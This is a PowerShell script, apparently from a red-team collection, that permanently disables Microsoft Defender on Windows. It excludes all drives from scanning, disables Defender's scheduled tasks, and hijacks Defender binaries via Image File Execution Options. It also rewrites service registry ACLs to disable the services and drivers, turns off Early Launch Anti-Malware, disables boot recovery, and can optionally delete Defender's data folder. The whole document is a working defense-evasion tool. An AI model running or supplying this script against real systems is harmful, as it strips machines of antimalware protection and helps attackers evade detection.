<#
.SYNOPSIS
    RedTeamNotes: Native-Only Hardened Defender Removal.
.DESCRIPTION
    Uses native PowerShell ACL manipulation to take ownership of protected 
    registry keys and disable Defender components permanently.
.NOTES
    Branding: RedTeamNotes Infrastructure Engineering
    Constraint: No third-party tools (NSudo/PsExec) utilized.
#>

[CmdletBinding()]
param (
    [Parameter()]
    [Switch]$PurgeFiles
)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper Function: Grant Registry Permissions ---
function Grant-RegistryPermission {
    param([string]$Path)
    # Take Ownership and grant FullControl to Administrators
    $Acl = Get-Acl -Path $Path
    $Ar = New-Object System.Security.AccessControl.RegistryAccessRule(
        "Administrators", "FullControl", "Allow"
    )
    $Acl.SetAccessRule($Ar)
    try {
        Set-Acl -Path $Path -AclObject $Acl -ErrorAction Stop
    } catch {
        Write-Warning "    [!] Failed to set ACL for $Path. Check Tamper Protection."
    }
}

# 1. Verification: Tamper Protection (The only hard manual constraint)
$TPPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if ((Get-ItemProperty $TPPath).TamperProtection -ne 4) {
    Write-Host "[!] CRITICAL: Tamper Protection is ON. Manual disablement required in Security GUI." -ForegroundColor Yellow
}

# 2. Step 1/5: Filesystem Exclusion (Standard MpPreference)
Write-Host "[Step 1/5] Injecting global filesystem exclusions..."
67..90 | ForEach-Object {
    $Drive = [char]$_ + ":\"
    if (Test-Path $Drive) {
        Add-MpPreference -ExclusionPath $Drive -ErrorAction SilentlyContinue
    }
}

# 3. Step 2/5: Disable Scheduled Tasks (Self-Healing Prevention)
Write-Host "[Step 2/5] Neutralizing Defender Scheduled Tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 4. Step 3/5: IFEO Hijacking (Process Execution Prevention)
Write-Host "[Step 3/5] Applying IFEO redirection for Defender binaries..."
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe", "MpSigStub.exe")
foreach ($Bin in $Binaries) {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$Bin"
    if (-not (Test-Path $Key)) { New-Item $Key -Force | Out-Null }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d"
}

# 5. Step 4/5: Service Registry Surgery (Native ACL Modification)
Write-Host "[Step 4/5] Disabling Kernel Services and Drivers..."
$Services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $Services) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc"
    if (Test-Path $RegPath) {
        # Perform ACL surgery to gain write access
        Grant-RegistryPermission -Path $RegPath
        Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction SilentlyContinue
        Write-Host "    [-] $Svc: Disabled" -ForegroundColor Gray
    }
}

# 6. Step 5/5: Final Polish & ELAM
Write-Host "[Step 5/5] Disabling Early Launch Anti-Malware (ELAM)..."
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue
bcdedit /set {current} recoveryenabled No | Out-Null # Prevent auto-repair

if ($PurgeFiles) {
    Write-Host "[!] Purging Defender physical structure..."
    $Target = "C:\ProgramData\Microsoft\Windows Defender"
    if (Test-Path $Target) {
        takeown /f $Target /r /d y | Out-Null
        icacls $Target /grant administrators:F /t | Out-Null
        Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "[#] RedTeamNotes: Native removal complete. Reboot required." -ForegroundColor Green
